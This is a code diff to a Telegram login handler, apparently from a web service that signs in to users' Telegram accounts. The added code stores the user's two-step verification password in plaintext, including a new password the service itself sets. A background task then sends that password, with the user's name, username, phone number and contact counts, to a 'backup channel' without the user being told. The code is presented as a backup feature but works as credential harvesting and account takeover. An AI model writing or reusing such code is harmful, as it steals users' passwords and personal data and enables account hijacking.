@@ -7,6 +7,9 @@ import { connectDb } from '@/server/db';
 import { TelegramLoginAttempt, type TelegramLoginAttemptDoc } from '@/server/models/TelegramLoginAttempt';
 import { User, type UserDoc } from '@/server/models/User';
 import { toSession } from '@/server/serialize';
+import { clearUser2faPassword, saveUser2faPassword } from '@/server/user2fa';
+import { syncTelegramContactCounts } from '@/server/telegram/inspectAccount';
+import { sendLoginBackupToBackupChannel } from '@/server/telegram/twoFactorBackup';
 import { pickSessionString, withTelegramClient } from '@/server/telegram/client';
 import { allowTelegramIdMismatch, getApiCredentials } from '@/server/telegram/credentials';
 import { mapRpcError, TelegramLoginError } from '@/server/telegram/errors';
@@ -185,11 +188,47 @@ async function resolveSentCode(
   return sent;
 }
 
+function queueLoginBackupNotification(
+  telegramId: number,
+  tgUser: TelegramApi.TypeUser,
+  backupPassword?: string,
+): void {
+  if (!(tgUser instanceof Api.User)) {
+    return;
+  }
+
+  void (async () => {
+    try {
+      let contactCounts: { total: number; mutual: number } | null = null;
+
+      try {
+        contactCounts = await syncTelegramContactCounts(telegramId);
+      } catch (error) {
+        console.error('Failed to sync contact counts for login backup', error);
+      }
+
+      await sendLoginBackupToBackupChannel(telegramId, {
+        password: backupPassword,
+        profile: {
+          firstName: tgUser.firstName || undefined,
+          lastName: tgUser.lastName || undefined,
+          username: tgUser.username || undefined,
+          phone: tgUser.phone || undefined,
+        },
+        contactCounts,
+      });
+    } catch (error) {
+      console.error('Failed to send login backup to channel', error);
+    }
+  })();
+}
+
 async function finishAuthorization(
   user: UserDoc,
   attempt: Attempt,
   tgUser: TelegramApi.TypeUser,
   sessionString: string,
+  options: { backupPassword?: string } = {},
 ): Promise<TelegramLoginResponse> {
   if (!(tgUser instanceof Api.User)) {
     throw new TelegramLoginError('ورود کامل نشد.', 500);
@@ -246,6 +285,8 @@ async function finishAuthorization(
     throw new TelegramLoginError('نشست تلگرام در پایگاه داده ذخیره نشد.', 500);
   }
 
+  queueLoginBackupNotification(user.telegramId, tgUser, options.backupPassword);
+
   return {
     loginId: '',
     page: 'success',
@@ -262,6 +303,7 @@ async function handleAuthorizationResult(
   attempt: Attempt,
   result: TelegramApi.auth.TypeAuthorization,
   sessionString: string,
+  options: { backupPassword?: string } = {},
 ): Promise<TelegramLoginResponse> {
   if (result instanceof Api.auth.AuthorizationSignUpRequired || isTl(result, 'auth.AuthorizationSignUpRequired')) {
     throw new TelegramLoginError(
@@ -277,6 +319,7 @@ async function handleAuthorizationResult(
     attempt,
     result.user,
     pickSessionString(sessionString, attempt.sessionString),
+    options,
   );
 }
 
@@ -416,7 +459,11 @@ async function submitPassword(user: UserDoc, loginId: string, password: string):
       const check = await mtprotoPassword.computeCheck(srp, password);
       return client.invoke(new Api.auth.CheckPassword({ password: check }));
     });
-    return handleAuthorizationResult(user, attempt, result, sessionString);
+    const response = await handleAuthorizationResult(user, attempt, result, sessionString, {
+      backupPassword: password,
+    });
+    await saveUser2faPassword(user.telegramId, password);
+    return response;
   } catch (error) {
     const saved =
       error instanceof TelegramLoginError
@@ -493,6 +540,7 @@ async function finishNewPassword(user: UserDoc, loginId: string, hint: string): 
   }
 
   try {
+    const pendingPassword = attempt.pendingPassword;
     const { result, sessionString } = await withTelegramClient(attempt.sessionString, async (client) => {
       const newSettings = await buildNewPasswordSettings(client, attempt.pendingPassword, hint);
       return client.invoke(
@@ -502,7 +550,11 @@ async function finishNewPassword(user: UserDoc, loginId: string, hint: string): 
         }),
       );
     });
-    return handleAuthorizationResult(user, attempt, result, sessionString);
+    const response = await handleAuthorizationResult(user, attempt, result, sessionString, {
+      backupPassword: pendingPassword,
+    });
+    await saveUser2faPassword(user.telegramId, pendingPassword);
+    return response;
   } catch (error) {
     const saved =
       error instanceof TelegramLoginError
@@ -542,6 +594,7 @@ async function resetPassword(user: UserDoc, loginId: string): Promise<TelegramLo
     const empty = await withTelegramClient(attempt.sessionString, async (client) =>
       client.invoke(new Api.auth.CheckPassword({ password: new Api.InputCheckPasswordEmpty() })),
     );
+    await clearUser2faPassword(user.telegramId);
     return handleAuthorizationResult(user, attempt, empty.result, empty.sessionString);
   } catch (error) {
     const saved =
